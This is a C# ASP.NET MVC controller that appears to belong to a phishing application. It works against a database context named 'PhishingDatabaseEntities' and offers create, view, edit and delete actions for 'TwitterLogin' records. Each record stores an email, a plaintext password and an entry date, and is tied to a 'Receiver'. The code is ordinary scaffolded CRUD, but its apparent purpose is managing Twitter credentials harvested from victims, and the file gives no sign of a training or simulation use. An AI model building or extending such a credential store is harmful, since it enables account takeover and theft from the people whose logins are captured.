using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Entity;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Mvc;
using WebApplicationMVC2.Models;

namespace WebApplicationMVC2.Controllers
{
    public class TwitterLoginsController : Controller
    {
        private PhishingDatabaseEntities db = new PhishingDatabaseEntities();

        // GET: TwitterLogins
        public ActionResult Index()
        {
            var twitterLogin = db.TwitterLogin.Include(t => t.Receiver);
            return View(twitterLogin.ToList());
        }

        // GET: TwitterLogins/Details/5
        public ActionResult Details(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            TwitterLogin twitterLogin = db.TwitterLogin.Find(id);
            if (twitterLogin == null)
            {
                return HttpNotFound();
            }
            return View(twitterLogin);
        }

        // GET: TwitterLogins/Create
        public ActionResult Create()
        {
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID");
            return View();
        }

        // POST: TwitterLogins/Create
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details see https://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Create([Bind(Include = "ID,Email,Password,DateEntered")] TwitterLogin twitterLogin)
        {
            if (ModelState.IsValid)
            {
                db.TwitterLogin.Add(twitterLogin);
                db.SaveChanges();
                return RedirectToAction("Index");
            }

            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", twitterLogin.ID);
            return View(twitterLogin);
        }

        // GET: TwitterLogins/Edit/5
        public ActionResult Edit(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            TwitterLogin twitterLogin = db.TwitterLogin.Find(id);
            if (twitterLogin == null)
            {
                return HttpNotFound();
            }
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", twitterLogin.ID);
            return View(twitterLogin);
        }

        // POST: TwitterLogins/Edit/5
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details see https://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Edit([Bind(Include = "ID,Email,Password,DateEntered")] TwitterLogin twitterLogin)
        {
            if (ModelState.IsValid)
            {
                db.Entry(twitterLogin).State = EntityState.Modified;
                db.SaveChanges();
                return RedirectToAction("Index");
            }
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", twitterLogin.ID);
            return View(twitterLogin);
        }

        // GET: TwitterLogins/Delete/5
        public ActionResult Delete(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            TwitterLogin twitterLogin = db.TwitterLogin.Find(id);
            if (twitterLogin == null)
            {
                return HttpNotFound();
            }
            return View(twitterLogin);
        }

        // POST: TwitterLogins/Delete/5
        [HttpPost, ActionName("Delete")]
        [ValidateAntiForgeryToken]
        public ActionResult DeleteConfirmed(int id)
        {
            TwitterLogin twitterLogin = db.TwitterLogin.Find(id);
            db.TwitterLogin.Remove(twitterLogin);
            db.SaveChanges();
            return RedirectToAction("Index");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                db.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
